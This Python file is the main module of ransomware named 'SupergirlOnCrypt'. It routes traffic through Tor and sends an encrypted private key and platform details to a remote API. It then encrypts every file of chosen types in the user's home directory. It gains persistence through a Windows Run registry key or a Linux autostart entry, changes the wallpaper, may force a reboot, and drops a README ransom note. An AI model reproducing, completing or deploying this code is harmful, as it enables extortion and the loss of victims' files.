import sys
import platform
import uuid
import json
import os
import time
import shutil
import base64
import requests
import Config
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend
from PyQt5.QtWidgets import QApplication
from RSA.RSAKeyGen import RSAKeyGen
from pathlib import Path
from Helper import Helper
from FileCrypter import FileCrypter
from TorManager import TorManager
from GUI import GUI

_helper = Helper()
_session = 0


def init():
    global _session
    tor = TorManager()
    tor.startProxy()
    _session = tor.getSession()
    if os.path.isfile(str(Path.home()) + '/supergirl.uuid'):
        id = open(str(Path.home()) + '/supergirl.uuid', "r").read()
        _helper.info('Using existing UUID => ' + id)
    else:
        id = genKeyPair()
        _helper.info('Generating UUID => ' + id)
        _helper.write_file(str(Path.home()) + '/supergirl.uuid', id)
        if Config.DEBUG_MODE is False:
            makePersistence()
        else:
            _helper.debug('Skipping Persistence')

    copyInstructions()
    startGui(id)

def startGui(id):
    if sys.platform == "linux" or sys.platform == "linux2":
        if not os.environ.get('XDG_CURRENT_DESKTOP') is None:
            app = QApplication(sys.argv)
            _ = GUI(id)
            sys.exit(app.exec_())
        else:
            _helper.super_logo()
            _helper.supergirl_pic()
            print("Supergirl needs a GUI. She encrypted your Files and you are screwed")
            print("Have a nice Day! ;)")
    else:
        app = QApplication(sys.argv)
        _ = GUI(id)
        sys.exit(app.exec_())

def makePersistence():
    if getattr(sys, 'frozen', False):
        dest = str(Path.home()) + '/SupergirlOnCrypt'
        if sys.platform == "win32":
            dest = dest + ".exe"
            dest = dest.replace('/', '\\')
        if not os.path.isfile(dest):
            shutil.copyfile(sys.executable, dest)
        if sys.platform == "win32":
            cmd = 'REG ADD "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /V "SupergirlOnCrypt" /t REG_SZ /F /D '
            cmd = cmd + '"' + dest + '"'
            os.system('start /wait cmd /c ' + cmd)

            #convert image to bmp cause...windows
            from PIL import Image
            file_in = _helper.path("res/wp.jpg")
            img = Image.open(file_in)

            file_out = str(Path.home()) + '/wp.bmp'
            if len(img.split()) == 4:
                # prevent IOError: cannot write mode RGBA as BMP
                r, g, b, _ = img.split()
                img = Image.merge("RGB", (r, g, b))
                img.save(file_out)
            else:
                img.save(file_out)
            time.sleep(1)
            file_out = file_out.replace('/', '\\')
            os.system('reg add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d ' + file_out + ' /f')
            time.sleep(1)
            os.system('RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters')
            if Config.WIN_SHOULD_REBOOT:
                time.sleep(1)
                #reboot for wallpaper change
                os.system("shutdown -t 0 -r -f")
                _helper.safe_exit()
        elif sys.platform == 'linux' or sys.platform == 'linux2':
            home = str(Path.home())
            if not os.path.isdir(home + '/.config/autostart/'):
                os.makedirs(home + '/.config/autostart')
            #load the desktop file and replace homedir
            with open(_helper.path('res/autostart_lin.desktop'), 'r') as f:
                desktop_file = f.read().replace("[home_folder]", home)
            with open(home + '/.config/autostart/supergirloncrypt.desktop', 'w') as fout:
                fout.write(desktop_file)
            os.system("chmod +x " + dest)
    else:
        _helper.warning('Not running as a frozen file - skipping persistence')


def genKeyPair():
    """Generates the Keypair and sends it to the API"""
    keys = RSAKeyGen()
    _helper.info("Public/Private Keypair generated!")
    cipher_cpriv_key = base64.b64encode(encryptClientPrivKey(keys.getPrivateKeyAsStr()))
    #send key and sys info to API
    os_info = platform.platform()
    unique_id = str(uuid.uuid4())
    data = {
        'hwid': unique_id,
        'priv_key': cipher_cpriv_key.decode('utf-8'),
        'platform': os_info
    }
    headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}
    try:
        req = _session.post(Config.API_URL + "/users/add", data=json.dumps(data), headers=headers)
        _helper.debug("Got Response from /users/add => " + str(req.json()))
        keys.forgetPrivate()
        encryptAllFiles(keys)
        return unique_id
    except requests.exceptions.RequestException:
        _helper.safe_exit()
    except requests.exceptions.ConnectionError:
        _helper.safe_exit()

def encryptAllFiles(keys):
    pathlist = []
    p = './test_files'
    if Config.DEBUG_MODE is False:
        p = str(Path.home())
    for types in Config.FILE_TYPES:
        pathlist.extend(Path(p).glob('**/*.' + types))
    for path in pathlist:
        path_in_str = str(path)
        #skip appdata dir
        if 'appdata' not in path_in_str.lower():
            fc = FileCrypter()
            try:
                fc.encrypt_file(path_in_str, keys.getPublicKeyAsStr())
                _helper.info("Encrypted " + path_in_str)
            except IOError:
                _helper.error("Could not encrypt " + path_in_str)


def encryptClientPrivKey(priv_key):
    """Encrypt the Clients private key (given as a str) with the servers public key"""
    with open(_helper.path('res/server.public.key'), "rb") as key_file:
        public_key = serialization.load_ssh_public_key(
            key_file.read(),
            backend=default_backend()
        )
        key_file.close()

    cipher = public_key.encrypt(
        bytes(priv_key, 'utf-8'),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA1(),
            label=None
        )
    )
    _helper.info("Private Client Key is encrypted")
    return cipher


def copyInstructions():
    home = str(Path.home())
    if not os.path.isfile(home + "/README.txt"):
        if sys.platform == "win32":
            shutil.copyfile(_helper.path("res/README.txt"), home + "/Desktop/README.txt")
        else:
            shutil.copyfile(_helper.path("res/README.txt"), home + "/README.txt")
        _helper.debug("Copy README to " + str(os.path.join(home, "README.txt")))


if __name__ == "__main__":
    _helper.info("Program started")
    init()
